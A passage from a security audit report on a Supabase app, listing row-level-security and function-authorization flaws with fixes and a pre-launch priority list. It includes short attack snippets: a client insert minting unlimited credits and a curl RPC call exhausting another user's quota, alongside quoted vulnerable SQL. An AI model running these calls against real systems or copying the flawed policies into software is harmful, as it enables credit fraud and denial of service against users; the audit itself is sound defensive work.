This policy only checks that the `user_id` column matches the caller's identity. It places **no restriction on the `delta` column value**. The user's credit balance is derived from a view that sums all deltas:

```sql
CREATE OR REPLACE VIEW public.v_user_credits AS
SELECT user_id, COALESCE(SUM(delta), 0) AS balance
FROM public.credit_ledger
GROUP BY user_id;
```

Any authenticated user can directly insert a positive `delta` row via the Supabase client or PostgREST API, completely bypassing the `fn_consume_credit` function's controlled deduction logic.

### Attack scenario

```javascript
// Attacker calls PostgREST directly — no edge function needed
await supabase
  .from('credit_ledger')
  .insert({ user_id: session.user.id, delta: 999999, reason: 'bonus' });

// Balance is now SUM(deltas) = 999999 + initial credits
// User has effectively unlimited credits
```

This allows any authenticated user to:
1. Grant themselves unlimited skip trace credits with a single API call
2. Bypass all credit-gating on skip traces, exports, and any other credit-gated feature

### Fix

Remove the INSERT policy for `authenticated` users entirely. The `credit_ledger` table should only be written to by `SECURITY DEFINER` functions (like `fn_consume_credit`) that enforce the correct signed delta:

```sql
DROP POLICY IF EXISTS credit_ledger_insert ON public.credit_ledger;
-- Only fn_consume_credit (SECURITY DEFINER, runs as postgres) should insert rows
```

If direct user inserts are needed for any reason, restrict the delta to be negative:

```sql
CREATE POLICY credit_ledger_insert
  ON public.credit_ledger FOR INSERT TO authenticated
  WITH CHECK (user_id = auth.uid() AND delta < 0);
```

---

## Finding 24 — 🟠 HIGH: `fn_increment_usage` Missing `auth.uid()` Guard — Quota Exhaustion Attack

**File:** `supabase/migrations/20260118211721_a62363c9-7a61-42d0-afc1-4bfa616f34c2.sql:289-326`

### What's wrong

`fn_increment_usage` is a `SECURITY DEFINER` function granted to all `authenticated` users. It accepts an optional `p_user_id` parameter with `DEFAULT auth.uid()`, but **never validates that the caller is the same user as `p_user_id`**:

```sql
CREATE OR REPLACE FUNCTION public.fn_increment_usage(
    p_usage_type text,
    p_amount integer DEFAULT 1,
    p_user_id uuid DEFAULT auth.uid()   -- ← no auth.uid() guard
)
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
...
AS $$
...
    UPDATE public.subscription_usage
    SET exports_count = exports_count + p_amount  -- ← increments for anyone
    WHERE user_id = p_user_id ...
$$;
```

### Attack scenario

1. Attacker looks up victim's UUID (visible in their own JWT or via profile lookups).
2. Attacker calls:
   ```bash
   curl -X POST .../rpc/fn_increment_usage \
     -d '{"p_usage_type": "exports", "p_amount": 999999, "p_user_id": "<victim_uuid>"}'
   ```
3. Victim's `subscription_usage.exports_count` is now at 999999 — far over any plan limit.
4. When the victim next tries to export, `fn_check_subscription_limit` returns `allowed: false` — the victim is effectively locked out of exporting for the rest of the billing month.

This is a Denial-of-Service attack against any specific user's subscription features.

Note: this same vulnerability class also applies to `fn_get_current_usage(p_user_id uuid DEFAULT auth.uid())` which, on first call for a period, inserts a new `subscription_usage` row for any user.

### Fix

Add a caller-identity guard identical to the fix for Findings 1 and 2:

```sql
IF p_user_id IS DISTINCT FROM auth.uid() THEN
  RAISE EXCEPTION 'Permission denied: cannot modify another user''s usage';
END IF;
```

---

## Finding 25 — 🟡 MEDIUM: Subscription Plan Enumeration via `fn_check_subscription_limit` and `fn_get_user_subscription`

**File:** `supabase/migrations/20260118211721_a62363c9-7a61-42d0-afc1-4bfa616f34c2.sql:196-398`

### What's wrong

Both `fn_get_user_subscription` and `fn_check_subscription_limit` accept an optional `p_user_id uuid DEFAULT auth.uid()` with no ownership check. Any authenticated user can query the subscription details of any other user:

```sql
-- fn_get_user_subscription: returns plan name, status, monthly limits, stripe_subscription_id
CREATE OR REPLACE FUNCTION public.fn_get_user_subscription(p_user_id uuid DEFAULT auth.uid())
...
-- fn_check_subscription_limit: returns allowed, current usage, limit, plan_name
CREATE OR REPLACE FUNCTION public.fn_check_subscription_limit(
    p_usage_type text,
    p_amount integer DEFAULT 1,
    p_user_id uuid DEFAULT auth.uid()
)
```

### Impact

An attacker with a list of user UUIDs (obtainable from profile tables or JWT inspection) can:
1. Enumerate the subscription plan of every user in the database
2. Determine each user's `stripe_subscription_id` (returned by `fn_get_user_subscription`)
3. Determine each user's current monthly export and skip-trace usage
4. Identify high-value targets (Enterprise subscribers) for further attacks

### Fix

Add ownership guard at the start of both functions:

```sql
IF p_user_id IS DISTINCT FROM auth.uid() THEN
  RAISE EXCEPTION 'Permission denied';
END IF;
```

---

## Finding 26 — 🔵 LOW: `clean_leads` Table Readable by All Authenticated Users

**File:** `supabase/migrations/20251115184248_35418040-0910-47c0-ae9d-e1870d9cd896.sql:199-204`

### What's wrong

The `clean_leads` table is described in the migration comment as "for admin bulk uploads." However, its SELECT RLS policy grants read access to every authenticated user:

```sql
-- All authenticated users can view clean_leads
CREATE POLICY "Users can view clean_leads"
ON public.clean_leads
FOR SELECT
TO authenticated
USING (true);   -- ← every subscriber can read all admin uploads
```

The table contains admin-curated lead data including `violation_description`, `snap_score`, `snap_insight`, `opened_date`, and property addresses that were uploaded during admin data-import operations. It may include staged data not yet intended for public consumption (e.g., rows mid-import, data for counties not included in a user's plan).

### Design review needed

If this table is the data source that populates `properties` (staging pipeline), rows in-flight during import are prematurely visible to all subscribers.

If this data is intended to be a readable public inventory (same as `properties`), the policy is acceptable — but `USING (true)` should be explicit about this intent in the code comment.

### Fix

If admin-only staging intent was the goal:

```sql
DROP POLICY IF EXISTS "Users can view clean_leads" ON public.clean_leads;
-- Only admins can read, via the "Admins full access to clean_leads" policy
```

If all-user read access is intentional, add a comment clarifying the design decision.

---

## Finding 27 — 🟡 MEDIUM: Admin Console Uses Unimplemented Backend with Insecure Auth Pattern

**File:** `src/services/adminApi.ts:1-10` and `src/pages/AdminConsole.tsx`

### What's wrong

The `/admin-console` route (correctly gated by `RoleProtectedRoute allowedRoles={['admin']}`) calls a completely unimplemented REST backend via `adminApi.ts`:

```typescript
const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:3000';

const getAuthHeaders = () => {
  const token = localStorage.getItem('authToken');  // ← never set anywhere in the app
  return {
    'Content-Type': 'application/json',
    ...(token && { 'Authorization': `Bearer ${token}` }),
  };
};
```

Every function in `adminApi.ts` is annotated `// Backend endpoint not implemented yet`. Two compounding problems:

1. **In production, all admin console API calls silently fail** — `VITE_API_URL` is not set, so requests go to `http://localhost:3000` which doesn't exist. Admins see an empty/broken dashboard with no error messages.

2. **The auth pattern is insecure for when the backend IS built** — `localStorage.getItem('authToken')` reads a custom token that the app never sets. When someone builds the backend and adds the corresponding `localStorage.setItem('authToken', ...)` call, they will be storing a privileged admin credential in localStorage — accessible to any XSS payload, browser extension, or compromised npm package. The correct pattern for Supabase-backed admin routes is to pass the Supabase session JWT from `supabase.auth.getSession()`, not a separate localStorage token.

### Impact

- **Now:** Admin console is completely broken in production (functional bug, not security bug)
- **When backend is built:** Admin credentials stored in localStorage are vulnerable to XSS theft, giving an attacker full access to all admin operations (disable users, retry uploads, deactivate jurisdictions)

### Fix

Replace the custom token pattern with the Supabase session JWT:

```typescript
const getAuthHeaders = async () => {
  const { data: { session } } = await supabase.auth.getSession();
  return {
    'Content-Type': 'application/json',
    ...(session?.access_token && { 'Authorization': `Bearer ${session.access_token}` }),
  };
};
```

The backend should then verify this JWT using Supabase's JWT secret and confirm the `admin` role via the `user_roles` table before serving any admin response.

---

## Summary: What Needs Fixing Before Launch

### Immediate — fix before any real users or data enter the system:

1. **`bulk-delete-properties` — add admin-only auth guard** — currently any registered user can permanently delete all property data for any US city or state. This is a complete database wipe vector.
2. **Drop or restrict `credit_ledger_insert` policy** — currently any authenticated user can insert a row with any positive `delta`, minting unlimited skip trace and feature credits.
3. **Add `auth.uid()` check to `fn_start_trial`** — prevents unauthorized trial manipulation for other users
4. **Add `auth.uid()` check to `fn_increment_trial_exports`** — prevents targeted trial quota exhaustion against other users
5. **Add `auth.uid()` check to `fn_increment_usage`** — prevents any user from exhausting another user's monthly export/skip-trace quota
6. **Add authentication to `weekly-digest`** — prevents unauthenticated mass email spam
7. **Add admin-only auth guards to `backfill-scores`, `bulk-rescore`, and `backfill-zips`** — prevents computational DoS by non-admin users
8. **Wrap `/upload` in `ProtectedRoute`** — unauthenticated visitors can upload 15MB files, exhausting storage quota
9. **Fix `escapeCSV` to sanitize formula-injection characters** — prevents CSV/DDE injection in exported data

### Short-term (fix within first week):

10. Add `auth.uid()` ownership guard to `fn_check_subscription_limit` and `fn_get_user_subscription` — prevents subscription plan enumeration across all users
11. Add rate limiting to `send-password-reset`, `send-support-message`, and `create-checkout-session`
12. Restrict `Access-Control-Allow-Origin` to the production domain
13. Strip `deletionResults` from `delete-user-account` response
14. Fix weekly-digest `from` address to `digest@snapignite.com`
15. Remove hardcoded Supabase credentials from `externalClient.ts`
16. Add job ownership validation to `process-upload`
17. Add path traversal protection to `sanitizeFilename`
18. Replace `adminApi.ts` localStorage token pattern with Supabase session JWT before building the admin backend

### Backlog (harden over time):

18. Replace `===` with constant-time comparison for `x-internal-secret` checks
19. Sanitize chart `id` before CSS template interpolation
20. Add TTL to localStorage role cache
21. Standardize Deno std library version across all functions
22. Add `SET search_path = public` to any remaining SECURITY DEFINER functions without it
23. Review `clean_leads` SELECT policy — confirm `USING (true)` is intentional and not exposing staging data
24. Apply `escapeHtml()` to `fullName`, property addresses in `send-support-message` and `weekly-digest` email templates

---

## Positive Security Notes

These were done correctly and should be maintained:

- ✅ Stripe webhook uses `constructEventAsync` with raw body — signature verification is correct
- ✅ `user_subscriptions` write access is restricted to service role via `"Service role manages subscriptions"` RLS policy
- ✅ `user_roles` INSERT/UPDATE/DELETE is restricted to admins only via `has_role(auth.uid(), 'admin')` check
- ✅ `fn_start_trial` prevents multiple trials with `trial_started_at IS NOT NULL` check
- ✅ Export limits are enforced server-side in both the edge function and the DB function (dual enforcement)
- ✅ Password reset `redirectTo` URL uses server-controlled `APP_URL` env var, not user input (no open redirect)
- ✅ `send-support-message` properly escapes HTML entities in user message content (`replace(/</g, "&lt;")`)
- ✅ File upload has server-side size limit enforcement (`MAX_FILE_SIZE_MB`)
- ✅ Admin-only functions (`backfill-insights`, `bulk-generate-missing-insights`, `refresh-outdated-insights`) implement the `x-internal-secret` pattern correctly
- ✅ `delete-user-account` correctly scopes deletion to the authenticated user's UUID from JWT, not from request body
